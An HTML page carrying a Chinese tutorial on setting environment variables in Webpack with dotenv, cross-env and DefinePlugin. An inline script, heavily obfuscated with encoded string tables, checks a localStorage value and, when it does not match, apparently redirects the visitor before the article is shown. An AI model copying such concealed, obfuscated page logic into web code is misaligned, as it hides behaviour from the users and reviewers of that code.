<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x5635(d,e){var s=_0x1ea1();return(_0x5635=function(e,n){var o=s[e-=288];void 0===_0x5635.IaYYdp&&(_0x5635.DESCYT=function(e,n){var o,c=[],d=0,s="";for(e=(e=>{for(var n,o,c="",d="",s=0,a=0;o=e.charAt(a++);~o&&(n=s%4?64*n+o:o,s++%4)&&(c+=String.fromCharCode(255&n>>(-2*s&6))))o="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(o);for(var p=0,r=c.length;p<r;p++)d+="%"+("00"+c.charCodeAt(p).toString(16)).slice(-2);return decodeURIComponent(d)})(e),a=0;a<256;a++)c[a]=a;for(a=0;a<256;a++)d=(d+c[a]+n.charCodeAt(a%n.length))%256,o=c[a],c[a]=c[d],c[d]=o;for(var a=0,d=0,p=0;p<e.length;p++)o=c[a=(a+1)%256],c[a]=c[d=(d+c[a])%256],c[d]=o,s+=String.fromCharCode(e.charCodeAt(p)^c[(c[a]+c[d])%256]);return s},d=arguments,_0x5635.IaYYdp=!0);var e=e+s[0],c=d[e];return c?o=c:(void 0===_0x5635.SFGCdP&&(_0x5635.SFGCdP=!0),o=_0x5635.DESCYT(o,n),d[e]=o),o})(d,e)}var _0x4065d0=_0x5635;function _0x1ea1(){var e=["W4xdTq1QW6LkWOZcHSoRta","dmkaWOhcNSoopgVdP2xcSW","W6PWW4zoWOHwWQJcJ0ZdUG","WPJcQrhcUwKvdSkeD8oSW6tcQmo0","WOlcSfBdQfVdS0zozG","WQ/cR8kmubbWm14lW75oWRW","vmocvSokehL6v8kYW5G","pCoViNLTWQJdHa","W5mBWOnkWQeXWPqtW5VdJW","afycW6ywCu/dQq","W5hcQSopvSohlK0tW7BdTvxcMq","jx7dHSk6W6WTW4P4W6Twz8oJmq","nSkJDZ82W7BdGcNcVCkCW5mT","jSkuW7GyW5xcGGpcTq","rCkTpYDfhCkh","WPzkjWixW7NcQ8k9pq","W4JdTanVWPaAWORcGSoTwmkRcW","afr8WRjPccpdQt5lqNLJ","iCoGWPBcVCkbt8oBuZ/cHSozpSkZ","lmkwB8ooWOhdNH3cRG","bCopucldUuVdNNHrWOWDW6K","WQ/dSwJdLmolsdyUx8oAWQWptI/dTSoxhCoMWOpcGCoSW413lCoRW4y","WQODwf3cMuv2Emky","W5zDWRZdUazLWPJcVG","DSo/mgfLWQxdSq","W5WyWPpdRYLbWPi","A8k/WOOTWQVcPCkUdInG","mmkdlmkyWQ4","WQVcQmkcA2RdRdesW5Lcx8k+","W4pdTwK9W6jCWPlcKW"];return(_0x1ea1=function(){return e})()}if((()=>{for(var e=_0x5635,n=_0x1ea1();;)try{if(274250==-parseInt(e(292,"LPen"))*(-parseInt(e(288,"yG[3"))/2)+-parseInt(e(314,"@@^G"))/3*(parseInt(e(310,"87nJ"))/4)+-parseInt(e(304,"@UAE"))/5*(-parseInt(e(307,"hJ4v"))/6)+-parseInt(e(294,"SO^d"))/7+-parseInt(e(301,"kF$a"))/8*(parseInt(e(309,"hJ4v"))/9)+parseInt(e(303,"5QCG"))/10*(parseInt(e(295,"eHiu"))/11)+-parseInt(e(289,"69a0"))/12)break;n.push(n.shift())}catch(e){n.push(n.shift())}})(),localStorage[_0x4065d0(298,"7)p7")](_0x4065d0(306,"w2kI"))!=_0x4065d0(311,"k!&F"))throw window[_0x4065d0(297,"V9jO")][_0x4065d0(308,"PYs#")](_0x4065d0(305,"#SJG")),Error();document.title="webpack 设置环境变量和全局变量",document.getElementById("article").innerHTML='<div><p>在 Webpack 中使用 <code>dotenv</code> 可以方便地管理和设置环境变量，以下是详细步骤和示例：</p>\n<h3>步骤 1：安装 <code>dotenv</code>  <code>cross-env</code></h3>\n<p>首先，在你的项目中安装 <code>dotenv</code> 库，它可以帮助你加载 <code>.env</code> 文件中的环境变量。在项目根目录下打开终端，执行以下命令：</p>\n<pre><code class="language-sh">npm install dotenv cross-env --save-dev\n</code></pre>\n<h3>步骤 2：创建 <code>.env</code> 文件</h3>\n<p>在项目根目录下创建 <code>.env</code> 文件，用于存储环境变量。例如，你可以创建以下内容：</p>\n<pre><code class="language-plaintext">NODE_ENV=development\nAPI_URL=https://api.example.com\n</code></pre>\n<p>你可以根据项目需求添加更多的环境变量。同时，为了区分不同环境，你还可以创建 <code>.env.development</code>、<code>.env.production</code> 等文件，分别用于开发环境和生产环境。</p>\n<h3>步骤 3：在 Webpack 配置中使用 <code>dotenv</code></h3>\n<p>在 Webpack 配置文件（通常是 <code>webpack.config.js</code>）中引入 <code>dotenv</code> 并加载环境变量，然后使用 <code>DefinePlugin</code> 将这些环境变量注入到你的应用中。</p>\n<pre><code>&quot;dev&quot;: &quot; cross-env NODE_ENV=prod  npx webpack-dev-server&quot;,\n</code></pre>\n<pre><code>const webpack = require(\'webpack\');\nconst dotenv = require(\'dotenv\');\n\n// 根据不同环境加载不同的.env文件\nconst env = dotenv.config({ path: `.env.${process.env.NODE_ENV}` }).parsed;\n\n// 将环境变量转换为适合 DefinePlugin 的格式\nconst envKeys = Object.keys(env).reduce((prev, next) =&gt; {\n    prev[`process.env.${next}`] = JSON.stringify(env[next]);\n    return prev;\n}, {});\n\nmodule.exports = {\n    // 其他 Webpack 配置项...\n    plugins: [\n        // 使用 DefinePlugin 将环境变量注入到应用中\n        new webpack.DefinePlugin(envKeys)\n    ]\n};\n    \n</code></pre>\n<h3>步骤 4：在代码中使用环境变量</h3>\n<p>配置完成后，你就可以在项目代码中使用这些环境变量了。例如，在 JavaScript 文件中：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;development&#x27;</span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;当前处于开发环境&#x27;</span>);\n}\n\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;API 地址:&#x27;</span>, process.<span class="hljs-property">env</span>.<span class="hljs-property">API_URL</span>);\n</code></pre>\n<h3>注意事项</h3>\n<ul>\n<li><strong>文件优先级</strong>  ：如果同时存在 <code>.env</code> 和 <code>.env.development</code> 文件，<code>.env.development</code> 文件中的变量会覆盖 <code>.env</code> 文件中同名的变量。</li>\n<li><strong>安全性</strong>  ：不要在 <code>.env</code> 文件中存储敏感信息，如数据库密码、API 密钥等。如果需要存储敏感信息，可以使用 <code>.env.local</code> 文件，该文件通常会被 <code>.gitignore</code> 忽略，不会被提交到版本控制系统中。</li>\n</ul>\n<p>通过以上步骤，你就可以在 Webpack 项目中使用 <code>dotenv</code> 方便地管理和设置环境变量了。</p>\n</div>'</script></body></html>